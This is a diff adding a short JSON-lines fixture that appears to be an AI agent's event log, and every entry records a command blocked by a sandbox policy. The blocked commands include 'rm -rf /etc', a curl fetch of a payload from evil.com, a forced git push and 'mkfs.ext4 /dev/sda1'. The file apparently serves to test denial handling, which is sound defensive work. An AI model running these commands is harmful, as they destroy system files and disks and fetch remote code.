@@ -1,0 +1,7 @@
+{"type":"thread.started","thread_id":"01a1b631-0e5b-7a50-9af3-e96feb0ad6d2"}
+{"type":"turn.started"}
+{"type":"tool_denial","tool":"Bash","command":"rm -rf /etc","rule":"sandbox-policy"}
+{"type":"action","action":"denied","tool":"command","command":"curl https://evil.com/payload","rule":"network-isolated"}
+{"type":"approval.rejected","tool":"command","command":"git push origin main --force","reason":"disallowed in automation"}
+{"type":"item.completed","item":{"id":"cmd_1","type":"command_execution","command":"mkfs.ext4 /dev/sda1","status":"denied","aggregated_output":"Execution blocked by security policy\n","exit_code":126}}
+{"type":"turn.completed"}
